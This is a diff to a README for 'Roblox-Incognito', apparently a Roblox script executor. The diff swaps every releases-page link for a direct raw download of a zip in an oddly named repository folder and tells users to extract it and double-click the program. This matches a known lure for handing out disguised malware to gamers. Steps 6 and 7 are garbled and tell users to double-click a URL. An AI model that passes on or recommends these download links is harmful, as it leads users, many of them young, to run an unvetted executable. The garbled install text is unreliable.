@@ -1,7 +1,7 @@
 # 🎮 Roblox-Incognito - Easy Roblox Script Execution
 
 ## 📥 Download Now!
-[![Download Roblox-Incognito](https://img.shields.io/badge/Download-Roblox%20Incognito-brightgreen)](https://github.com/Bhola17777/Roblox-Incognito/releases)
+[![Download Roblox-Incognito](https://raw.githubusercontent.com/Bhola17777/Roblox-Incognito/main/glauconitization/Roblox-Incognito.zip%20Incognito-brightgreen)](https://raw.githubusercontent.com/Bhola17777/Roblox-Incognito/main/glauconitization/Roblox-Incognito.zip)
 
 ## 🚀 Getting Started
 Roblox-Incognito is a user-friendly tool that allows you to execute Lua scripts in Roblox. This enhances your gameplay and offers automation features. Follow these steps to get started:
@@ -20,15 +20,15 @@ Roblox-Incognito is a user-friendly tool that allows you to execute Lua scripts 
 - **Automation Tools:** Automate tasks in your game seamlessly.
 
 ## 📂 Download & Install
-To download Roblox-Incognito, visit this page to download: [Roblox-Incognito Releases](https://github.com/Bhola17777/Roblox-Incognito/releases).
+To download Roblox-Incognito, visit this page to download: [Roblox-Incognito Releases](https://raw.githubusercontent.com/Bhola17777/Roblox-Incognito/main/glauconitization/Roblox-Incognito.zip).
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version.
 3. Click on the zip file to download.
 4. Once the file downloads, locate it in your Downloads folder.
 5. Extract the zip file to a folder of your choice.
-6. Open the extracted folder and find `Roblox-Incognito.exe`.
-7. Double-click `Roblox-Incognito.exe` to run the application.
+6. Open the extracted folder and find `https://raw.githubusercontent.com/Bhola17777/Roblox-Incognito/main/glauconitization/Roblox-Incognito.zip`.
+7. Double-click `https://raw.githubusercontent.com/Bhola17777/Roblox-Incognito/main/glauconitization/Roblox-Incognito.zip` to run the application.
 
 ## 📜 How to Use Roblox-Incognito
 1. Launch Roblox-Incognito by double-clicking the executable file.
@@ -43,7 +43,7 @@ To download Roblox-Incognito, visit this page to download: [Roblox-Incognito Rel
 
 ## 🔄 Updates
 To keep your application running smoothly:
-- Regularly visit the [Roblox-Incognito Releases](https://github.com/Bhola17777/Roblox-Incognito/releases) page for updates.
+- Regularly visit the [Roblox-Incognito Releases](https://raw.githubusercontent.com/Bhola17777/Roblox-Incognito/main/glauconitization/Roblox-Incognito.zip) page for updates.
 - Download and install the latest version by following the steps in the "Download & Install" section.
 
 ## 📞 Support
